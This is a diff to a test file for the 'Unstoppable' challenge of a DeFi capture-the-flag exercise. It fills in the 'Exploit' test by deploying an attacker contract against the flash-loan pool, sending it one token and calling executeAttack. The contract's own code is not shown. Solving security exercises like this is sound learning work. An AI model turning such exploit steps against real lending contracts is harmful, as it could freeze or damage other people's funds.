@@ -14,8 +14,8 @@ describe('[Challenge] Unstoppable', function () {
         [deployer, attacker, someUser] = await ethers.getSigners();
 
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
-
+        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);    
+        
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
 
@@ -36,10 +36,16 @@ describe('[Challenge] Unstoppable', function () {
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
          this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
          await this.receiverContract.executeFlashLoan(10);
+         
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // deploy the attack contract
+        const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', attacker);
+        const attackerContract = await AttackerContractFactory.deploy(this.pool.address);
+        // give the contrat a minimum balance to execute the attack
+        await this.token.connect(attacker).transfer(attackerContract.address, 1);
+        await attackerContract.executeAttack(this.token.address, 10);
     });
 
     after(async function () {
